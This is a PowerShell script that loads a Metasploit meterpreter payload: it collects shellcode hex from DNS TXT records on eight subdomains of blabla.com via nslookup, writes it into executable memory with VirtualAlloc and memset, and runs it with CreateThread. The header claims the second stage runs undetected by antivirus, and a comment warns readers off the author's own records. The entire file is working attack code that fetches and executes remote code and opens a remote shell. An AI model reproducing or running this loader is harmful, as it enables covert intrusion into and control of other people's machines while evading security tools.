<#
Powershell for DNS based meterpreter payload 
This script will load in memory the first stage of metasploit meterpreter that exists in txt record .
The second stage will be transferred and executed in memory with 0 detection from the antivirus engines.
Author: Nicolas Krassas
Inspired by corelanc0d3r dns based shellcode and Matthew Graeber
#>
# Functions for creating a thread
$code = @"
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);
"@
 
function Convert-HexStringToByteArray {
################################################################
#.Synopsis
# Convert a string of hex data into a System.Byte[] array. An
# array is always returned, even if it contains only one byte.
#.Parameter String
# A string containing hex data in any of a variety of formats,
# including strings like the following, with or without extra
# tabs, spaces, quotes or other non-hex characters:
# 0x41,0x42,0x43,0x44
# \x41\x42\x43\x44
# 41-42-43-44
# 41424344
# The string can be piped into the function too.
# http://www.sans.org/windows-security/2010/02/11/powershell-byte-array-hex-convert
################################################################
[CmdletBinding()]
Param ( [Parameter(Mandatory = $True, ValueFromPipeline = $True)] [String] $String )
 
#Clean out whitespaces and any other non-hex crud.
$String = $String.ToLower() -replace '[^a-f0-9\\\,x\-\:]',''
 
#Try to put into canonical colon-delimited format.
$String = $String -replace '0x|\\x|\-|,',':'
 
 
#Remove beginning and ending colons, and other detritus.
$String = $String -replace '^:+|:+$|x|\\',''
 
#Maybe there's nothing left over to convert...
if ($String.Length -eq 0) { ,@() ; return } 
 
#Split string with or without colon delimiters.
if ($String.Length -eq 1)
{ ,@([System.Convert]::ToByte($String,16)) }
elseif (($String.Length % 2 -eq 0) -and ($String.IndexOf(":") -eq -1))
{ ,@($String -split '([a-f0-9]{2})' | foreach-object { if ($_) {[System.Convert]::ToByte($_,16)}}) }
elseif ($String.IndexOf(":") -ne -1)
{ ,@($String -split ':+' | foreach-object {[System.Convert]::ToByte($_,16)}) }
else
{ ,@() }
#The strange ",@(...)" syntax is needed to force the output into an
#array even if there is only one element in the output (or none).
}
 
function GetShellCode($hostname)
{
$result = iex "cmd.exe /c `"nslookup  -querytype=txt -timeout=5 $hostname 2> NUL`""
$shellarray = ""
foreach ($line in $result)
{
	$line=$line.trim()
	if ($line.contains("`""))
	{$shellarray = $line.split("`"")[1].trim()}
}
"$shellarray"
}
"Got the shellcode from txt records"
# My txt records you better not use them, or you may see me in your system :)
 
$shellpart1 = GetShellCode "a.blabla.com"
$shellpart2 = GetShellCode "b.blabla.com"
$shellpart3 = GetShellCode "c.blabla.com"
$shellpart4 = GetShellCode "d.blabla.com"
$shellpart5 = GetShellCode "e.blabla.com"
$shellpart6 = GetShellCode "f.blabla.com"
$shellpart7 = GetShellCode "g.blabla.com"
$shellpart8 = GetShellCode "h.blabla.com"
 
$myshell = " $shellpart1$shellpart2$shellpart3$shellpart4$shellpart5$shellpart6$shellpart7$shellpart8 "
 
# Thread control
$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru
 
# msf meterpreter stage 1, this one must be converted to proper byte array first.
[Byte[]]$sc =   Convert-HexStringToByteArray($myshell) 
 
# Calculate correct size param for VirtualAlloc
$size = 0x1000
if ($sc.Length -gt 0x1000) {$size = $sc.Length}
 
# Allocate memory 
$x=$winFunc::VirtualAlloc(0,0x1000,$size,0x40)
 
# build it in memory
for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)}
Try {
$winFunc::CreateThread(0,0,$x,0,0,0)
sleep 100000
}
Catch
{
[system.exception]
"caught a system exception"
}
